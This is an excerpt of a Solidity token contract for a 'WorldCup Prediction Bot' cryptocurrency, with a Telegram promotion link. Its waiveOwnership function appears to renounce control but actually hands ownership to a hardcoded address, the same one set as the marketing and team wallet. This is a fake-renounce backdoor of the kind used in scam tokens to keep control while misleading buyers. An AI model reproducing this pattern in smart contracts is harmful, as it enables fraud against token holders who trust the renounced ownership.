...
/**
Telegram : https://t.me/worldcuppredictionbot
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x244BEeDa5b72386769d033438558F925e550726D);
    }
...
contract WORLDCUPBOT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "WorldCup Prediction Bot";
    string private _symbol = "$WORLDCUPBOT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x244BEeDa5b72386769d033438558F925e550726D);
    address payable public teamWalletAddress = payable(0x244BEeDa5b72386769d033438558F925e550726D);
